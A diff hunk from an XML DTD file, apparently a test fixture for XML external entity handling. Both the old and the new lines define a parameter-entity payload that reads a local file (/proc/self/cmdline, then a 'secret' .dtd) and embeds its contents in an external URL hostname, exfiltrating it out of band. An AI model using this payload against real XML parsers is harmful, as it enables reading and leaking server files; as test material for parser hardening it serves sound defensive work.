@@ -55,7 +55,7 @@
         value CDATA #REQUIRED
 >
 
-<!ENTITY % payload SYSTEM "file:///proc/self/cmdline">
-<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://92343.domain.%payload;.com">'>
+<!ENTITY % payload SYSTEM "file:/src/something-very-secret.dtd">
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://92343.%payload;.com">'>
 %param1;
 %external;
